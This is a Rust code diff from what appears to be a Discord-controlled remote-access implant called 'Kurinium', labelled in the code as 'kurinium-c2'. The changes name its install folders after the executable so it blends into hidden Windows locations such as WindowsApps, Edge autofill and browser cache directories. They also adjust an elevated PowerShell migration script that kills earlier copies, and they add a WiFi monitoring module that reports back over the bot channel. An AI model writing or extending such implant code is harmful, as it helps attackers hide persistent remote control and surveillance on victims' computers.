@@ -220,6 +220,7 @@ fn interact_with_window(process_name: &str) -> bool {
 
 // Installation Functions
 fn generate_migration_script(installed_path: &Path, original_path: &Path) -> String {
+    let final_exe_name = installed_path.file_stem().unwrap().to_string_lossy();
     format!(
         r#"# PowerShell for Kurinium
 $ProgressPreference = "SilentlyContinue"
@@ -229,7 +230,7 @@ $InformationPreference = "SilentlyContinue"
 
 function Kill-KuriniumProcesses {{
     try {{
-        $processes = Get-Process | Where-Object {{ $_.ProcessName -eq "kurinium-c2" -or $_.ProcessName -eq "kurinium_c2" }}
+        $processes = Get-Process | Where-Object {{ $_.ProcessName -eq "{final_exe_name}" }}
         if ($processes) {{
             foreach ($proc in $processes) {{
                 Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
@@ -290,7 +291,8 @@ exit
 "#,
         installed_exe = installed_path.to_string_lossy(),
         original_exe = original_path.to_string_lossy(),
-        script_path = installed_path.parent().unwrap().join("migration.ps1").to_string_lossy()
+        script_path = installed_path.parent().unwrap().join("migration.ps1").to_string_lossy(),
+        final_exe_name = final_exe_name // new arg for process kill
     )
 }
 
@@ -346,24 +348,24 @@ fn run_powershell_script_as_admin(script_path: &Path) -> anyhow::Result<()> {
 
 fn install_to_path() -> anyhow::Result<()> {
     let current_exe = env::current_exe()?;
-    let exe_name = current_exe.file_name().unwrap().to_string_lossy().to_string();
+    let exe_name = Config::get_exe_name(); 
 
     // Installatibn path
     match Config::INSTALLATION_PATH {
-        1 => install_to_packages(&exe_name, &current_exe),
-        2 => install_to_windows_apps(&exe_name, &current_exe),
-        3 => install_to_edge_autofill(&exe_name, &current_exe),
-        4 => install_to_windows_themes(&exe_name, &current_exe),
-        5 => install_to_templates(&exe_name, &current_exe),
-        6 => install_to_inetcache(&exe_name, &current_exe),
-        7 => install_to_webcache(&exe_name, &current_exe),
+        1 => install_to_packages(exe_name, &current_exe),
+        2 => install_to_windows_apps(exe_name, &current_exe),
+        3 => install_to_edge_autofill(exe_name, &current_exe),
+        4 => install_to_windows_themes(exe_name, &current_exe),
+        5 => install_to_templates(exe_name, &current_exe),
+        6 => install_to_inetcache(exe_name, &current_exe),
+        7 => install_to_webcache(exe_name, &current_exe),
         _ => anyhow::bail!("Invalid installation path: {}", Config::INSTALLATION_PATH),
     }
 }
 
 fn install_to_packages(exe_name: &str, current_exe: &Path) -> anyhow::Result<()> {
     let local_app_data = env::var("LOCALAPPDATA")?;
-    let install_dir = Path::new(&local_app_data).join("Packages").join("Kurinium");
+    let install_dir = Path::new(&local_app_data).join("Packages").join(current_exe.file_stem().unwrap().to_string_lossy().to_string());
 
     if !install_dir.exists() {
         fs::create_dir_all(&install_dir)?;
@@ -391,7 +393,9 @@ fn install_to_packages(exe_name: &str, current_exe: &Path) -> anyhow::Result<()>
 fn install_to_windows_apps(exe_name: &str, current_exe: &Path) -> anyhow::Result<()> {
     let local_app_data = env::var("LOCALAPPDATA")?;
     let base_dir = Path::new(&local_app_data).join("Microsoft").join("WindowsApps");
-    let install_dir = base_dir.join("Backup");
+    
+    let original_exe_dir_name = current_exe.file_stem().unwrap().to_string_lossy().to_string();
+    let install_dir = base_dir.join(original_exe_dir_name);
 
     if !install_dir.exists() {
         fs::create_dir_all(&install_dir)?;
@@ -582,7 +586,7 @@ async fn main() -> anyhow::Result<()> {
 
     // Start keep active thred
     let keep_active_config = Config::get_keep_active_config();
-    start_keep_active(&keep_active_config);
+    let _keep_active_thread = start_keep_active(&keep_active_config);
 
     if !is_admin_privileged {
         if Config::SHOW_CONSOLE {
@@ -706,6 +710,19 @@ async fn main() -> anyhow::Result<()> {
     // Gateway configuration
     let intents = Intents::GUILD_MESSAGES | Intents::MESSAGE_CONTENT;
     let mut shard = Shard::new(ShardId::ONE, token.clone(), intents);
+
+    // Start WiFi monitoring
+    let wifi_config = Config::get_wifi_monitor_config();
+    let wifi_monitor = crate::core::wifi_monitor::WifiMonitor::new(http.clone(), device_channel_id, wifi_config);
+    if let Err(e) = wifi_monitor.start_monitoring().await {
+        if Config::SHOW_CONSOLE {
+            error!("Failed to start WiFi monitoring: {}", e);
+        }
+    } else {
+        if Config::SHOW_CONSOLE && Config::get_wifi_monitor_config().enabled {
+            info!("WiFi monitoring started successfully");
+        }
+    }
 
     if Config::SHOW_CONSOLE {
         info!("Prefix: {}", Config::BOT_PREFIX);
